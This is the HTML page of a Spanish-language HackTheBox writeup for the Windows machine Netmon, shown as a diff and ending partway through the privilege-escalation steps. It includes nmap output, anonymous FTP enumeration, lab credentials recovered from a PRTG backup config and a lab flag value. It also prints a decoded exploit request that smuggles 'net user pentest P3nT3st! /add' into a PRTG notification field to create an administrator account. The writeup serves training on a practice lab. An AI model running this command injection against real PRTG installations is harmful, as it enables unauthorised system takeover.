@@ -1,0 +1,716 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/piece.png">
+
+<title>Firtsmiracle Blog de Ciberseguridad</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Maquina Netmon - htb writeup | Firtsmiracle blog de Ciberseguridad</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="Maquina Netmon - htb writeup" />
+<meta name="author" content="Firtsmiracle" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Hoy vamos a resolver la máquina Netmon de la plataforma de hackthebox correspondiente a una maquina windows dificultad facil, la cual explotaremos a partir de una enumeración por ftp donde obtendremos archivos de configuración con credenciales que nos permitiran conectarnos al servicio web y despues nos aprovecharemos de una vulnerabilidad de PRTG que nos permitira realizar la creación de un usuario a nivel de sistema y le añadiremos permisis de administrador, para finalmente conectarnos al sistema como el usuario administrator." />
+<meta property="og:description" content="Hoy vamos a resolver la máquina Netmon de la plataforma de hackthebox correspondiente a una maquina windows dificultad facil, la cual explotaremos a partir de una enumeración por ftp donde obtendremos archivos de configuración con credenciales que nos permitiran conectarnos al servicio web y despues nos aprovecharemos de una vulnerabilidad de PRTG que nos permitira realizar la creación de un usuario a nivel de sistema y le añadiremos permisis de administrador, para finalmente conectarnos al sistema como el usuario administrator." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/htb-writeup-Netmon" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/htb-writeup-Netmon" />
+<meta property="og:site_name" content="Firtsmiracle blog de Ciberseguridad" />
+<meta property="og:image" content="http://localhost:4000/assets/images/HTB/htb-writeup-Netmon/banner.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-06-13T00:00:00+00:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:4000/assets/images/HTB/htb-writeup-Netmon/banner.png" />
+<meta property="twitter:title" content="Maquina Netmon - htb writeup" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Firtsmiracle"},"dateModified":"2023-06-13T00:00:00+00:00","datePublished":"2023-06-13T00:00:00+00:00","description":"Hoy vamos a resolver la máquina Netmon de la plataforma de hackthebox correspondiente a una maquina windows dificultad facil, la cual explotaremos a partir de una enumeración por ftp donde obtendremos archivos de configuración con credenciales que nos permitiran conectarnos al servicio web y despues nos aprovecharemos de una vulnerabilidad de PRTG que nos permitira realizar la creación de un usuario a nivel de sistema y le añadiremos permisis de administrador, para finalmente conectarnos al sistema como el usuario administrator.","headline":"Maquina Netmon - htb writeup","image":"http://localhost:4000/assets/images/HTB/htb-writeup-Netmon/banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/htb-writeup-Netmon"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/piece.png"},"name":"Firtsmiracle"},"url":"http://localhost:4000/hackthebox/htb-writeup-Netmon"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<!-- CSS -->
+<link href="/assets/css/prism.css" rel="stylesheet">
+<!-- SCSS can't be processed by browser, so we use .CSS to fix it -->
+<link href="/assets/css/theme.css" rel="stylesheet">
+<link href="/assets/css/modal.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h2>BLog de Ciberseguridad</h2><br><br>
+        <li><a href="/" id="menu-home">Inicio</a></li>
+        <li><a href="/categories#articulos">Artículos</a></li>
+        <li><a href="/categories#hackthebox" id="menu-hackthebox">HackTheBox</a></li>
+        <li><a href="/categories#novedades" id="menu-tryhackme">Novedades</a></li>
+        <li><a href="/tags">Tags</a></li>
+        <li><a href="/about" id="menu-aboutme">Información</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Buscar..."/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/piece.png" alt="Firtsmiracle blog de Ciberseguridad">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <script defer src="/assets/js/lightbox.js"></script>
+
+<div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">Maquina Netmon - htb writeup</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/?s=250&d=mm&r=x" alt="">
+            
+        </div>            
+        <div>
+        Firtmiracle <a targ="_blank" class="text-info"></a> el 
+        <span class="post-date"><time class="post-date" datetime="2023-06-13">13 Jun 2023</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="/assets/images/HTB/htb-writeup-Netmon/banner.png" alt="Maquina Netmon - htb writeup">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Hoy vamos a resolver la máquina <code>Netmon</code> de la plataforma de <code>hackthebox</code> correspondiente a una maquina <code>windows</code> dificultad facil, la cual explotaremos a partir de una enumeración por <code>ftp</code> donde obtendremos archivos de configuración con credenciales que nos permitiran conectarnos al servicio web y despues nos aprovecharemos de una vulnerabilidad de <code>PRTG</code> que nos permitira realizar la creación de un usuario a nivel de sistema y le añadiremos permisis de administrador, para finalmente conectarnos al sistema como el usuario <code>administrator</code>.</p>
+
+<p>Vamos a comenzar creando un directorio con el nombre de la maquina:</p>
+
+<pre><code class="language-bash">❯ mkdir Netmon
+❯ ls
+ Netmon
+</code></pre>
+<p>Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:</p>
+
+<pre><code class="language-bash">❯ which mkt
+mkt () {
+	mkdir {nmap,content,exploits,scripts}
+}
+❯ mkt
+❯ ls
+ content   exploits   nmap   scripts
+</code></pre>
+
+<h2 id="enumeracion">Enumeración <a href="#enumeracion">#</a></h2>
+
+<p>Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando <code>ping</code>:</p>
+
+<pre><code class="language-bash">❯ ping -c 1 10.10.10.152
+PING 10.10.10.152 (10.10.10.152) 56(84) bytes of data.
+64 bytes from 10.10.10.152: icmp_seq=1 ttl=127 time=200 ms
+
+--- 10.10.10.152 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 199.775/199.775/199.775/0.000 ms
+</code></pre>
+<p>Vemos que la maquina nos responde, con un ttl de <code>127</code>correspondiente a una maquina <code>windows</code>, ahora procederemos a el escaneo de puertos con la ayuda de <code>nmap</code>:</p>
+
+<h3 id="escaneo-de-puertos">Escaneo de Puertos</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="#enumeracion">-p-</a></td>
+      <td style="text-align: left">Escaneamos todos los 65535 puertos.</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">–open</a></td>
+      <td style="text-align: left">Solo los puertos que estén abiertos.</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">-v</a></td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando (verbose).</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">-oG</a></td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para que mediante una funcion de <a href="https://s4vitar.github.io/">S4vitar</a> nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre <code>openPorts</code>:</p>
+
+<pre><code class="language-java">❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.152 -oG openPorts
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-14 04:18 GMT
+Initiating SYN Stealth Scan at 04:18
+Scanning 10.10.10.152 [65535 ports]
+Discovered open port 80/tcp on 10.10.10.152
+Discovered open port 21/tcp on 10.10.10.152
+Discovered open port 135/tcp on 10.10.10.152
+Discovered open port 139/tcp on 10.10.10.152
+Discovered open port 445/tcp on 10.10.10.152
+Discovered open port 49667/tcp on 10.10.10.152
+Discovered open port 49664/tcp on 10.10.10.152
+Discovered open port 49668/tcp on 10.10.10.152
+Discovered open port 47001/tcp on 10.10.10.152
+Discovered open port 49666/tcp on 10.10.10.152
+Discovered open port 49669/tcp on 10.10.10.152
+Discovered open port 5985/tcp on 10.10.10.152
+Discovered open port 49665/tcp on 10.10.10.152
+Completed SYN Stealth Scan at 04:18, 23.62s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.152
+Host is up, received user-set (0.14s latency).
+Scanned at 2023-06-14 04:18:22 GMT for 24s
+Not shown: 63185 closed tcp ports (reset), 2337 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE      REASON
+21/tcp    open  ftp          syn-ack ttl 127
+80/tcp    open  http         syn-ack ttl 127
+135/tcp   open  msrpc        syn-ack ttl 127
+139/tcp   open  netbios-ssn  syn-ack ttl 127
+445/tcp   open  microsoft-ds syn-ack ttl 127
+5985/tcp  open  wsman        syn-ack ttl 127
+47001/tcp open  winrm        syn-ack ttl 127
+49664/tcp open  unknown      syn-ack ttl 127
+49665/tcp open  unknown      syn-ack ttl 127
+49666/tcp open  unknown      syn-ack ttl 127
+49667/tcp open  unknown      syn-ack ttl 127
+49668/tcp open  unknown      syn-ack ttl 127
+49669/tcp open  unknown      syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 23.76 seconds
+           Raw packets sent: 116389 (5.121MB) | Rcvd: 77893 (3.116MB)
+</code></pre>
+
+<h3 id="escaneo-de-version-y-servicios">Escaneo de Version y Servicios.</h3>
+
+<pre><code class="language-java">❯ nmap -sCV -p21,80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669 10.10.10.152 -oN targeted
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-14 04:19 GMT
+Nmap scan report for 10.10.10.152
+Host is up (0.40s latency).
+
+PORT      STATE SERVICE      VERSION
+21/tcp    open  ftp          Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| 02-03-19  12:18AM                 1024 .rnd
+| 02-25-19  10:15PM       &lt;DIR&gt;          inetpub
+| 07-16-16  09:18AM       &lt;DIR&gt;          PerfLogs
+| 02-25-19  10:56PM       &lt;DIR&gt;          Program Files
+| 02-03-19  12:28AM       &lt;DIR&gt;          Program Files (x86)
+| 02-03-19  08:08AM       &lt;DIR&gt;          Users
+|_02-25-19  11:49PM       &lt;DIR&gt;          Windows
+| ftp-syst: 
+|_  SYST: Windows_NT
+80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
+|_http-server-header: PRTG/18.1.37.13946
+| http-title: Welcome | PRTG Network Monitor (NETMON)
+|_Requested resource was /index.htm
+|_http-trane-info: Problem with XML parsing of /evox/about
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49668/tcp open  msrpc        Microsoft Windows RPC
+49669/tcp open  msrpc        Microsoft Windows RPC
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb-security-mode: 
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2023-06-14T04:20:28
+|_  start_date: 2023-06-14T04:14:56
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 77.25 seconds
+</code></pre>
+<p>Visulizamos informacion interesante de los puertos escaneados:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th>Servicio</th>
+      <th>Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>21</td>
+      <td>FTP</td>
+      <td>Microsoft ftpd</td>
+    </tr>
+    <tr>
+      <td>80</td>
+      <td>HTTP</td>
+      <td>Indy httpd 18.1.37.13946</td>
+    </tr>
+    <tr>
+      <td>135</td>
+      <td>RPC</td>
+      <td>Microsoft Windows RPC</td>
+    </tr>
+    <tr>
+      <td>139</td>
+      <td>LDAP</td>
+      <td>Microsoft Windows netbios-ssn</td>
+    </tr>
+    <tr>
+      <td>445</td>
+      <td>SMP</td>
+      <td>Microsoft Windows Server 2008 R2 - 2012 microsoft-ds</td>
+    </tr>
+    <tr>
+      <td>5985</td>
+      <td>WINRM</td>
+      <td>Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</td>
+    </tr>
+    <tr>
+      <td>47001</td>
+      <td>HTTP</td>
+      <td>Microsoft HTTPAPI httpd 2.0</td>
+    </tr>
+    <tr>
+      <td>49664-49669</td>
+      <td>MSRPC</td>
+      <td>Microsoft Windows RPC</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="explotación">Explotación <a href="#explotación">#</a></h2>
+
+<p>Comenzaremos enumerando el servicio <code>ftp</code> haciendo uno del usuario <code>anonymous</code>, sin proporcionar contraseña.</p>
+
+<pre><code class="language-bash">❯ ftp 10.10.10.152
+Connected to 10.10.10.152.
+220 Microsoft FTP Service
+Name (10.10.10.152:fmiracle): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password:
+230 User logged in.
+Remote system type is Windows_NT.
+ftp&gt; dir
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+02-03-19  12:18AM                 1024 .rnd
+02-25-19  10:15PM       &lt;DIR&gt;          inetpub
+07-16-16  09:18AM       &lt;DIR&gt;          PerfLogs
+02-25-19  10:56PM       &lt;DIR&gt;          Program Files
+02-03-19  12:28AM       &lt;DIR&gt;          Program Files (x86)
+02-03-19  08:08AM       &lt;DIR&gt;          Users
+02-25-19  11:49PM       &lt;DIR&gt;          Windows
+226 Transfer complete.
+</code></pre>
+
+<p>Si nos dirigimos al directorio <code>Users</code>, vemos que podemos obtener la primera flag <code>user.txt</code>, pero aun no tenemos acceso al sistema.</p>
+
+<pre><code class="language-bash">ftp&gt; cd Users
+250 CWD command successful.
+ftp&gt; dir
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+02-25-19  11:44PM       &lt;DIR&gt;          Administrator
+02-03-19  12:35AM       &lt;DIR&gt;          Public
+226 Transfer complete.
+ftp&gt; cd Public
+250 CWD command successful.
+ftp&gt; dir
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+02-03-19  08:05AM       &lt;DIR&gt;          Documents
+07-16-16  09:18AM       &lt;DIR&gt;          Downloads
+07-16-16  09:18AM       &lt;DIR&gt;          Music
+07-16-16  09:18AM       &lt;DIR&gt;          Pictures
+06-14-23  12:15AM                   34 user.txt
+07-16-16  09:18AM       &lt;DIR&gt;          Videos
+226 Transfer complete.
+ftp&gt; get user.txt
+local: user.txt remote: user.txt
+200 PORT command successful.
+150 Opening ASCII mode data connection.
+226 Transfer complete.
+34 bytes received in 0.20 secs (0.1620 kB/s)
+ftp&gt; exit
+221 Goodbye.
+❯ cat user.txt
+❯ c07be14afc2253b24510769dcb7db65
+</code></pre>
+
+<p>Para poder enumear de una manera mas comoda los archivos mediante <code>ftp</code>, vamos a crearnos una montura con la herramienta <code>curlftpfs</code>.</p>
+
+<pre><code class="language-bash">❯ curlftpfs
+❯ mkdir /mnt/monturaftp
+❯ curlftpfs ftp://10.10.10.152 /mnt/monturaftp
+❯ ls -l /mnt/monturaftp
+d--------- root root   0 B  Sun Nov 20 22:46:00 2016  $RECYCLE.BIN
+d--------- root root   0 B  Sun Feb  3 08:05:00 2019  Documents and Settings
+d--------- root root   0 B  Mon Feb 25 22:15:00 2019  inetpub
+d--------- root root   0 B  Sat Jul 16 09:18:00 2016  PerfLogs
+d--------- root root   0 B  Mon Feb 25 22:56:00 2019  Program Files
+d--------- root root   0 B  Sun Feb  3 00:28:00 2019  Program Files (x86)
+d--------- root root   0 B  Wed Dec 15 10:40:00 2021  ProgramData
+d--------- root root   0 B  Sun Feb  3 08:05:00 2019  Recovery
+d--------- root root   0 B  Sun Feb  3 08:04:00 2019  System Volume Information
+d--------- root root   0 B  Sun Feb  3 08:08:00 2019  Users
+d--------- root root   0 B  Mon Feb 25 23:49:00 2019  Windows
+.--------- root root 380 KB Sun Nov 20 21:59:00 2016  bootmgr
+.--------- root root   1 B  Sat Jul 16 09:10:00 2016  BOOTNXT
+.--------- root root 704 MB Wed Jun 14 00:14:00 2023  pagefile.sys
+</code></pre>
+
+<p>Antes de segui enumerando vamos a ver el servicio web, que esta expuesto en el puerto 80.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Netmon/netmon1.PNG" alt="" /></p>
+
+<p>Vemos que el servicio corresponde a <code>PRTG Network Monitor</code>.</p>
+
+<blockquote>
+  <p>PRTG Network Monitor: PRTG (Paessler Router Traffic Grapher hasta la versión 7) es un software de monitoreo de red sin agentes de Paessler AG. El término general Paessler PRTG aúna varias versiones de software capaces de monitorizar y clasificar diferentes condiciones del sistema, como el uso del ancho de banda o el  tiempo de actividad, y recopilar estadísticas de diversos anfitriones como switches, routers, servidores y otros dispositivos y aplicaciones.</p>
+</blockquote>
+
+<p>Buscamos si hay <code>exploits</code> asociados a este servicio y entre ellos una de ejecución remota de comandos.</p>
+
+<pre><code class="language-bash">❯ searchsploit PRTG
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                       |  Path
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution                                                                                 | windows/webapps/46527.sh
+PRTG Network Monitor 20.4.63.1412 - 'maps' Stored XSS                                                                                                | windows/webapps/49156.txt
+PRTG Network Monitor &lt; 18.1.39.1648 - Stack Overflow (Denial of Service)                                                                             | windows_x86/dos/44500.py
+PRTG Traffic Grapher 6.2.1 - 'url' Cross-Site Scripting                                                                                              | java/webapps/34108.txt
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+</code></pre>
+
+<p>El exploit nos pide estar autenticados, asi que vamos a examinar la montura que previamente creamos y trataremos de buscar archivos de configuración, ya que estos suelen almacenar credenciales.</p>
+
+<p>Encontramos archivos de configuración, y usaremos <code>diff</code> para encontrar diferncias entre el archivo <code>.dat</code> y el archivo <code>old.bak</code></p>
+
+<pre><code class="language-bash">diff "PRTG Configuration.dat" "PRTG Configuration.old.bak" | less
+&lt;               &lt;flags&gt;
+&lt;                 &lt;encrypted/&gt;
+&lt;               &lt;/flags&gt;
+---
+&gt;             &lt;!-- User: prtgadmin --&gt;
+&gt;             PrTg@dmin2018
+317c313
+&lt;                 77RULO2GA4Q3RVEUZ77IMPLVKABRRS2UNR3Q====
+---
+&gt;                 6SLJOGVBYWJF5ZMURQWHEPJ3C3WT2NQDJOZA====
+325c321
+&lt;                 IVK3MVDI6HCMYIRYQN264YLIRXNJWMB6NT3Q====
+---
+&gt;                 ILD5YN3TROUJXG6ECLVDRKIPKTBKE274FTNQ====
+</code></pre>
+
+<p>Obtenemos las credenciales <code>prtgadmin:PrTg@dmin2018</code> con las cuales podamos logearnos en el servicio <code>PRTG</code>, pero al intentar logearnos nos dicen que las credenciales son invalidas.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Netmon/netmon3.PNG" alt="" /></p>
+
+<p>Podemos tratar de hacer guesing y debido a que la contraseña termina en 2018, podemos modificarla por 2019.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Netmon/netmon4.PNG" alt="" /></p>
+
+<p>Logramos conectarnos al panel como el usuario <code>administrator</code>.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Netmon/netmon5.PNG" alt="" /></p>
+
+<h2 id="escalada-de-privilegios">Escalada de Privilegios <a href="#escalada-de-privilegios">#</a></h2>
+
+<p>Si revisamos el exploit que tenemos, vemos que este realiza una petición a la ruta <code>myaccount.htm?tabid=2</code> y envia una data que se encuentra <code>urlencodeada</code>.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Netmon/netmon2.PNG" alt="" /></p>
+
+<p>Usaremos una sesión interactiva de <code>php</code> para urldecodear la data y ver mejor que es lo que envia.</p>
+
+<pre><code class="language-php">❯ php --interactive
+Interactive mode enabled
+php &gt; echo urldecode("name_=create_user&amp;tags_=&amp;active_=1&amp;schedule_=-1%7CNone%7C&amp;postpone_=1&amp;comments=&amp;summode_=2&amp;summarysubject_=%5B%25sitename%5D+%25summarycount+Summarized+Notifications&amp;summinutes_=1&amp;accessrights_=1&amp;accessrights_=1&amp;accessrights_201=0&amp;active_1=0&amp;addressuserid_1=-1&amp;addressgroupid_1=-1&amp;address_1=&amp;subject_1=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&amp;contenttype_1=text%2Fhtml&amp;customtext_1=&amp;priority_1=0&amp;active_17=0&amp;addressuserid_17=-1&amp;addressgroupid_17=-1&amp;message_17=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&amp;active_8=0&amp;addressuserid_8=-1&amp;addressgroupid_8=-1&amp;address_8=&amp;message_8=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&amp;active_2=0&amp;eventlogfile_2=application&amp;sender_2=PRTG+Network+Monitor&amp;eventtype_2=error&amp;message_2=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&amp;active_13=0&amp;sysloghost_13=&amp;syslogport_13=514&amp;syslogfacility_13=1&amp;syslogencoding_13=1&amp;message_13=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&amp;active_14=0&amp;snmphost_14=&amp;snmpport_14=162&amp;snmpcommunity_14=&amp;snmptrapspec_14=0&amp;messageid_14=0&amp;message_14=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&amp;senderip_14=&amp;active_9=0&amp;url_9=&amp;urlsniselect_9=0&amp;urlsniname_9=&amp;postdata_9=&amp;active_10=0&amp;active_10=10&amp;address_10=Demo+EXE+Notification+-+OutFile.ps1&amp;message_10=%22C%3A%5CUsers%5CPublic%5Ctester.txt%3Bnet+user+pentest+P3nT3st!+%2Fadd%22&amp;windowslogindomain_10=&amp;windowsloginusername_10=&amp;windowsloginpassword_10=&amp;timeout_10=60&amp;active_15=0&amp;accesskeyid_15=&amp;secretaccesskeyid_15=&amp;arn_15=&amp;subject_15=&amp;message_15=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&amp;active_16=0&amp;isusergroup_16=1&amp;addressgroupid_16=200%7CPRTG+Administrators&amp;ticketuserid_16=100%7CPRTG+System+Administrator&amp;subject_16=%25device+%25name+%25status+%25down+(%25message)&amp;message_16=Sensor%3A+%25name%0D%0AStatus%3A+%25status+%25down%0D%0A%0D%0ADate%2FTime%3A+%25datetime+(%25timezone)%0D%0ALast+Result%3A+%25lastvalue%0D%0ALast+Message%3A+%25message%0D%0A%0D%0AProbe%3A+%25probe%0D%0AGroup%3A+%25group%0D%0ADevice%3A+%25device+(%25host)%0D%0A%0D%0ALast+Scan%3A+%25lastcheck%0D%0ALast+Up%3A+%25lastup%0D%0ALast+Down%3A+%25lastdown%0D%0AUptime%3A+%25uptime%0D%0ADowntime%3A+%25downtime%0D%0ACumulated+since%3A+%25cumsince%0D%0ALocation%3A+%25location%0D%0A%0D%0A&amp;autoclose_16=1&amp;objecttype=notification&amp;id=new&amp;targeturl=%2Fmyaccount.htm%3Ftabid%3D2");
+
+name_=create_user&amp;tags_=&amp;active_=1&amp;schedule_=-1|None|&amp;postpone_=1&amp;comments=&amp;summode_=2&amp;summarysubject_=[%sitename] %summarycount Summarized Notifications&amp;summinutes_=1&amp;accessrights_=1&amp;accessrights_=1&amp;accessrights_201=0&amp;active_1=0&amp;addressuserid_1=-1&amp;addressgroupid_1=-1&amp;address_1=&amp;subject_1=[%sitename] %device %name %status %down (%message)&amp;contenttype_1=text/html&amp;customtext_1=&amp;priority_1=0&amp;active_17=0&amp;addressuserid_17=-1&amp;addressgroupid_17=-1&amp;message_17=[%sitename] %device %name %status %down (%message)&amp;active_8=0&amp;addressuserid_8=-1&amp;addressgroupid_8=-1&amp;address_8=&amp;message_8=[%sitename] %device %name %status %down (%message)&amp;active_2=0&amp;eventlogfile_2=application&amp;sender_2=PRTG Network Monitor&amp;eventtype_2=error&amp;message_2=[%sitename] %device %name %status %down (%message)&amp;active_13=0&amp;sysloghost_13=&amp;syslogport_13=514&amp;syslogfacility_13=1&amp;syslogencoding_13=1&amp;message_13=[%sitename] %device %name %status %down (%message)&amp;active_14=0&amp;snmphost_14=&amp;snmpport_14=162&amp;snmpcommunity_14=&amp;snmptrapspec_14=0&amp;messageid_14=0&amp;message_14=[%sitename] %device %name %status %down (%message)&amp;senderip_14=&amp;active_9=0&amp;url_9=&amp;urlsniselect_9=0&amp;urlsniname_9=&amp;postdata_9=&amp;active_10=0&amp;active_10=10&amp;address_10=Demo EXE Notification - OutFile.ps1&amp;message_10="C:\Users\Public\tester.txt;net user pentest P3nT3st! /add"&amp;windowslogindomain_10=&amp;windowsloginusername_10=&amp;windowsloginpassword_10=&amp;timeout_10=60&amp;active_15=0&amp;accesskeyid_15=&amp;secretaccesskeyid_15=&amp;arn_15=&amp;subject_15=&amp;message_15=[%sitename] %device %name %status %down (%message)&amp;active_16=0&amp;isusergroup_16=1&amp;addressgroupid_16=200|PRTG Administrators&amp;ticketuserid_16=100|PRTG System Administrator&amp;subject_16=%device %name %status %down (%message)&amp;message_16=Sensor: %name
+Status: %status %down
+
+&amp;autoclose_16=1&amp;objecttype=notification&amp;id=new&amp;targeturl=/myaccount.htm?tabid=2
+</code></pre>
+
+<p>Vemos que la data se enviar a un parametro <code>message_10</code>, en donde crea un usuario de nombre <code>pentest</code> a nivel de sistema <code>net user pentest P3nT3st! /add</code>.</p>
+
+<p>Podemos aprovecharnos de este y ejecutar una instrucción similar a la del exploit, donde crearemos un usuario al cual pondre de nombre <code>pentest</code> y ademas lo añadire al grupo de Administradores.</p>
+
+<p>Nos dirigimos a la ruta a donde manda la petición, damos en <code>Add new Notification</code>.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Netmon/netmon6.PNG" alt="" /></p>
+
+<p>Creamos un nombre de Notificación, en este caso <code>Nuevo</code>.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Netmon/netmon9.PNG" alt="" /></p>
+
+<p>y ahora activamos la función <code>Execute Program</code></p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Netmon/netmon10.PNG" alt="" /></p>
+
+<p>podemos ver varios inputs y si los inspeccionamos encontramos el de <code>message_10</code> que corresponde a <code>Parameter</code></p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Netmon/netmon8.PNG" alt="" /></p>
+
+<p>Ejecutamos en el campo la instrucción, donde crearemos nuestro usuario y lo añadiremos al grupo administrador.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Netmon/netmon11.PNG" alt="" /></p>
+
+<p>Guardamos y ahora en la notificación creada le damos en el simbolo de la campana <code>Send</code>.</p>
+
